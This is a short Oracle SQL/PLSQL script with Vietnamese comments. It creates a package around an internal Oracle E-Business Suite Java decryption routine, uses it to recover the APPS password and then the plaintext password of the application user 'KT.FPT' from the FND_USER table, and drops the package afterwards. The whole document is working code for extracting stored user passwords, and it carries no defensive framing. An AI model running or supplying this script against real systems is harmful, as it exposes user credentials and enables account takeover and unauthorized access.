--tao pkg
create or replace package decode_pkg as
  function decrypt(key in varchar2, value in varchar2) return varchar2;
end;
/
create or replace package body decode_pkg as
function decrypt(key in varchar2, value in varchar2) return varchar2 as
language java name 'oracle.apps.fnd.security.WebSessionManagerProc.decrypt(java.lang.String,java.lang.String) return java.lang.String';
end;
/
--decode pass user ung dung
select *
  from (select usr.user_name,
               decode_pkg.decrypt((select (select decode_pkg.decrypt(fnd_web_sec.get_guest_username_pwd,
                                                                    usertable.encrypted_foundation_password)
                                            from dual) as apps_password
                                    from fnd_user usertable
                                   where usertable.user_name =
                                         (select substr(fnd_web_sec.get_guest_username_pwd,
                                                        1,
                                                        instr(fnd_web_sec.get_guest_username_pwd,
                                                              '/') - 1)
                                            from dual)),
                                  usr.encrypted_user_password) password,
               usr.encrypted_user_password
          from fnd_user usr)
 where password is not null
   and user_name = 'KT.FPT'
 order by user_name
/
drop package decode_pkg;
